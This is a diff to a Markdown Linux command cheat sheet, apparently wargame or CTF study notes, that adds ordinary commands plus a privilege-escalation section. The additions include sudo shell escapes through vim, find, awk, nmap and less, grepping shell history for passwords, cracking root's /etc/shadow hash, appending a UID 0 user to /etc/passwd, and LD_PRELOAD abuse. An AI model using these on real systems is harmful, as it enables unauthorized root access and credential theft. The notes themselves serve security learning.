@@ -17,6 +17,7 @@
 11. [🔑 Linux Permissions](#linux-permissions)
 12. [🔨 Bash Scripting](#bash-scripting)
 13. [🔐 Security & Exploitation Tools](#security--exploitation-tools)
+14. [🔓 Privilege Escalation](#privilege-escalation)
 
 ---
 
@@ -65,10 +66,13 @@ cat ./-                      # file whose name is a dash
 cat "./file with spaces"     # file whose name contains spaces
 ```
 
-For large files, use:
+For large files, use `less` or `head`/`tail`:
 
 ```bash
 less file.txt
+head -n 20 file.txt     # first 20 lines
+tail -n 20 file.txt     # last 20 lines
+tail -f /var/log/syslog  # follow a log file in real time
 ```
 
 ---
@@ -176,6 +180,39 @@ clear
 
 ---
 
+### `id`
+Displays the current user's UID, GID, and group memberships.
+
+```bash
+id
+id username
+```
+
+---
+
+### `uname`
+Displays system information (kernel, architecture, hostname).
+
+```bash
+uname -a         # all info: kernel, hostname, architecture, OS
+uname -r         # kernel version only
+uname -m         # architecture (x86_64, etc.)
+```
+
+---
+
+### `history`
+Displays the shell command history for the current user.
+
+```bash
+history
+history | grep "ssh"
+cat ~/.*history | less          # read all history files
+cat ~/.*history | grep -i 'pass\|mysql\|ssh'   # search for credentials
+```
+
+---
+
 ### `date`
 Displays the current system date and time. Supports custom output formatting.
 
@@ -243,6 +280,32 @@ Keyboard shortcuts:
 
 ---
 
+### `vim`
+Powerful modal text editor — steep learning curve but extremely versatile.
+
+```bash
+vim file.txt
+```
+
+| Mode     | Key         | Description                     |
+|----------|-------------|---------------------------------|
+| Normal   | `Esc`       | Default mode — navigate/command |
+| Insert   | `i`         | Enter insert mode (type text)   |
+| Command  | `:`         | Enter command line              |
+
+Essential commands:
+
+| Command    | Action                          |
+|------------|---------------------------------|
+| `:w`       | Save                            |
+| `:q`       | Quit                            |
+| `:wq`      | Save and quit                   |
+| `:q!`      | Quit without saving             |
+| `:!/bin/sh`| Escape to shell (GTFOBins)      |
+| `-c ':!/bin/sh'` | Execute shell on startup (GTFOBins) |
+
+---
+
 ## 🔍 Search & Text Processing
 
 ### `find`
@@ -253,6 +316,8 @@ find / -name "*.txt"
 find / -type f -name "secret"
 find / -type f -user bob -group dev -size 33c 2>/dev/null
 find / -type f -size 1033c ! -executable 2>/dev/null
+find / -perm -u=s -type f 2>/dev/null          # find all SUID binaries
+find . -exec /bin/sh \; -quit                   # spawn a shell (GTFOBins)
 ```
 
 | Flag | Description |
@@ -263,7 +328,10 @@ find / -type f -size 1033c ! -executable 2>/dev/null
 | `-user` | Match by owner |
 | `-group` | Match by group |
 | `-size Nc` | Match by size in bytes |
+| `-perm -4000` | Match files with SUID bit set |
+| `-perm -u=s` | Match files with SUID bit set (alternative) |
 | `! -executable` | Exclude executable files |
+| `-exec CMD {} \;` | Execute a command on each match |
 
 > `2>/dev/null` suppresses permission error output.
 
@@ -291,6 +359,25 @@ grep -o "[0-9]\+" file.txt
 | `-v` | Invert — show lines that do NOT match |
 | `-E` | Extended regex (alternation, `+`, `?`, etc.) |
 | `-o` | Print only the matched part, not the whole line |
+
+---
+
+### `awk`
+Pattern-based text processing tool — splits input into fields and applies actions.
+
+```bash
+awk '{print $1}' file.txt                # print first field of each line
+awk -F: '{print $1}' /etc/passwd         # use : as delimiter, print usernames
+awk '/error/ {print $0}' log.txt         # print lines matching "error"
+awk 'BEGIN {system("/bin/sh")}'          # spawn a shell (GTFOBins)
+```
+
+| Flag   | Description                          |
+|--------|--------------------------------------|
+| `-F`   | Set the field delimiter              |
+| `$0`   | Entire line                          |
+| `$1`   | First field                          |
+| `$NF`  | Last field                           |
 
 ---
 
@@ -502,6 +589,28 @@ wget http://example.com/file.txt
 
 ---
 
+### `curl`
+Transfers data from or to a server. Supports HTTP, HTTPS, FTP, and more.
+
+```bash
+curl http://example.com                  # GET request, output to stdout
+curl -o file.html http://example.com     # save output to file
+curl -I http://example.com               # fetch headers only
+curl -X POST -d "key=value" http://url   # POST request with data
+curl -s http://example.com               # silent mode (no progress bar)
+```
+
+| Flag  | Description                     |
+|-------|---------------------------------|
+| `-o`  | Write output to file            |
+| `-I`  | Fetch HTTP headers only         |
+| `-X`  | Specify HTTP method             |
+| `-d`  | Send data (POST body)           |
+| `-s`  | Silent mode                     |
+| `-L`  | Follow redirects                |
+
+---
+
 ### `nc` (Netcat)
 Opens raw TCP/UDP connections. Useful for interacting with services directly.
 
@@ -509,8 +618,20 @@ Opens raw TCP/UDP connections. Useful for interacting with services directly.
 nc host port              # connect to a host on a port
 nc localhost 30000        # connect to a local service
 nc -l -p 1234             # listen on port 1234 (TCP server mode)
+nc -lvnp 1234             # verbose listener, no DNS resolution
 echo "data" | nc -l -p 1234 &   # serve data in background
 ```
+
+| Flag  | Description                                    |
+|-------|------------------------------------------------|
+| `-l`  | Listen mode (TCP server)                       |
+| `-p`  | Specify port number                            |
+| `-n`  | Numeric only — skip DNS resolution             |
+| `-v`  | Verbose output                                 |
+| `-vv` | Very verbose output                            |
+| `-k`  | Keep listening after client disconnects        |
+
+> Port < 1024 requires root to listen on.
 
 ---
 
@@ -534,6 +655,7 @@ nmap host                            # default scan
 nmap -p 31000-32000 localhost        # scan a specific port range
 nmap -p- localhost                   # scan all 65535 ports
 nmap --top-ports 20 host            # scan the 20 most common ports
+nmap -sn 192.168.1.0/24            # ping sweep — discover active hosts, no port scan
 ```
 
 #### Scan types
@@ -657,7 +779,10 @@ ping -v hostname          # verbose output
 |------|------------------------------------|
 | `-4` | Force IPv4 requests only           |
 | `-i` | Set interval between pings         |
+| `-s` | Set ICMP data payload size (bytes) |
 | `-v` | Verbose output                     |
+
+> ICMP header is 8 bytes. Windows Firewall blocks ping by default.
 
 ---
 
@@ -1054,7 +1179,13 @@ Executes a command as another user (default: root). Requires the target user to 
 sudo command
 sudo -u username command
 sudo -u app-admin /bin/cat /path/to/file
+sudo -l                                  # list current user's sudo permissions
 ```
+
+| Flag  | Description                                |
+|-------|--------------------------------------------|
+| `-u`  | Run as a specific user                     |
+| `-l`  | List allowed (and forbidden) commands      |
 
 The allowed commands per user are configured in `/etc/sudoers`.
 
@@ -1087,4 +1218,133 @@ echo -e '#!/bin/bash\ncat /path/to/secret' > /tmp/fake/ls
 chmod +x /tmp/fake/ls
 export PATH=/tmp/fake:$PATH
 ./vulnerable_suid_binary
+```
+
+---
+
+## 🔓 Privilege Escalation
+
+### PrivEsc Enumeration Checklist
+
+Key files and commands to check during Linux privilege escalation:
+
+```bash
+uname -a                                           # kernel version, architecture
+id && whoami                                       # current user and groups
+sudo -l                                            # sudo permissions
+cat /etc/passwd                                    # list all users
+cat /etc/shadow                                    # password hashes (if readable)
+cat /etc/crontab                                   # scheduled cron jobs
+cat /etc/exports                                   # NFS shares configuration
+cat ~/.*history | less                             # command history
+ps aux                                             # running processes
+find / -perm -u=s -type f 2>/dev/null             # SUID binaries
+```
+
+---
+
+### `john` (John the Ripper)
+Password cracking tool. Runs on the attacker's machine, not on the target.
+
+```bash
+john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt    # crack with wordlist
+john --show hash.txt                                          # display cracked passwords
+```
+
+Extract a hash from `/etc/shadow`:
+
+```bash
+grep "root" /etc/shadow > hash.txt
+```
+
+---
+
+### `mkpasswd`
+Generates a password hash suitable for `/etc/shadow`.
+
+```bash
+mkpasswd -m sha-512 newpassword
+```
+
+---
+
+### `openssl passwd`
+Generates a password hash suitable for `/etc/passwd`.
+
+```bash
+openssl passwd newpassword
+```
+
+Inject a new root user into a world-writable `/etc/passwd`:
+
+```bash
+echo 'newroot:HASH:0:0:root:/root:/bin/bash' >> /etc/passwd
+su newroot
+```
+
+---
+
+### `gcc`
+Compiles C source code. Used in PrivEsc to build shared libraries or custom binaries.
+
+```bash
+gcc -o output source.c                                    # basic compilation
+gcc -fPIC -shared -nostartfiles -o /tmp/preload.so lib.c  # compile shared library
+```
+
+---
+
+### `ldd`
+Lists the shared libraries required by a binary.
+
+```bash
+ldd /usr/sbin/apache2
+ldd /usr/bin/passwd
+```
+
+Used in LD_LIBRARY_PATH exploitation to identify which library to replace.
+
+---
+
+### `mount`
+Mounts a filesystem or network share.
+
+```bash
+mount                                # list all mounted filesystems
+mount /dev/sda1 /mnt                 # mount a local partition
+mount -t nfs target:/share /mnt      # mount an NFS share
+umount /mnt                          # unmount
+```
+
+Used in NFS `no_root_squash` exploitation — mount the share on the attacker machine as root.
+
+---
+
+### LD_PRELOAD / LD_LIBRARY_PATH
+
+If `env_keep+=LD_PRELOAD` appears in `sudo -l` output, a shared library can be injected:
+
+```bash
+sudo LD_PRELOAD=/tmp/preload.so find
+```
+
+If `env_keep+=LD_LIBRARY_PATH` is set, replace a library used by an allowed sudo binary:
+
+```bash
+ldd /usr/sbin/apache2
+sudo LD_LIBRARY_PATH=/tmp apache2
+```
+
+---
+
+### GTFOBins — Sudo Exploitation
+
+When `sudo -l` allows running a binary, check [GTFOBins](https://gtfobins.github.io) for shell escapes:
+
+```bash
+sudo find . -exec /bin/sh \; -quit
+sudo vim -c ':!/bin/sh'
+sudo awk 'BEGIN {system("/bin/sh")}'
+sudo nmap --interactive              # then type !sh
+sudo less /etc/passwd                # then type !/bin/sh
 ```
